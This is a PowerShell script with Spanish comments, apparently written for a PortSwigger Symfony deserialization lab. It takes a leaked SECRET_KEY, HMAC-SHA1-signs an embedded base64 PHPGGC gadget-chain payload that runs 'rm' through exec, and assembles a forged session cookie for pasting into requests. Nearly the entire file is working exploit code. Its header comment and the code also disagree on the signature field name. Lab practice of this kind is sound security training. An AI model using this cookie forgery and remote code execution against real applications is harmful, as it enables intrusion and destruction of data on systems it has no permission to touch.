# ============================================================
#  Firma HMAC-SHA1 y arma la cookie de sesion (lab Symfony PortSwigger)
#  Cookie = base64( {"token":"<b64>","sign_hmac_sha1":"<hmac hex del token>"} )
# ============================================================

# --- EDITAR ACA ---
$Secret = "1uyv5u1x0aqqvwnis9gjzutymd03wsck"          # el SECRET_KEY filtrado (phpinfo / config)
$Token  = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmV
udFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaG
VcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL
21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6
IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGV
cQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eU
FkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319"                                 # base64 de phpggc. Vacio = lo toma del portapapeles
# ------------------

if (-not $Token) { $Token = (Get-Clipboard).Trim() }
$Token = ($Token -replace '\s','')   # borra TODO el whitespace (incl. newlines internos): causa comun de firma invalida

if (-not $Token) { Write-Host "[X] No hay token (ni variable ni portapapeles)" -ForegroundColor Red; return }
if ($Secret -eq "PEGA_ACA_EL_SECRET_KEY") { Write-Host "[X] Falta poner el SECRET_KEY" -ForegroundColor Red; return }

# 1) HMAC-SHA1 sobre el string del token (base64), key = SECRET_KEY
$hmac = New-Object System.Security.Cryptography.HMACSHA1
$hmac.Key = [Text.Encoding]::UTF8.GetBytes($Secret)
$sigBytes = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($Token))
$Sign = ([BitConverter]::ToString($sigBytes) -replace '-','').ToLower()

# 2) Armar el JSON exactamente como lo espera Symfony (token primero)
$json = '{"token":"' + $Token + '","sig_hmac_sha1":"' + $Sign + '"}'

# 3) Base64 del JSON = valor de la cookie
$cookie = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))

# 4) URL-encoded (para pegar en el header Cookie)
$cookieUrl = [uri]::EscapeDataString($cookie)

Write-Host "== Firma HMAC-SHA1 (hex) ==" -ForegroundColor Cyan
Write-Host $Sign
Write-Host ""
Write-Host "== JSON ==" -ForegroundColor Cyan
Write-Host $json
Write-Host ""
Write-Host "== Cookie (base64) ==" -ForegroundColor Cyan
Write-Host $cookie
Write-Host ""
Write-Host "== Cookie URL-encoded (pegar en el header) ==" -ForegroundColor Green
Write-Host $cookieUrl

$cookieUrl | Set-Clipboard
Write-Host "[+] Cookie URL-encoded copiada al portapapeles" -ForegroundColor Green
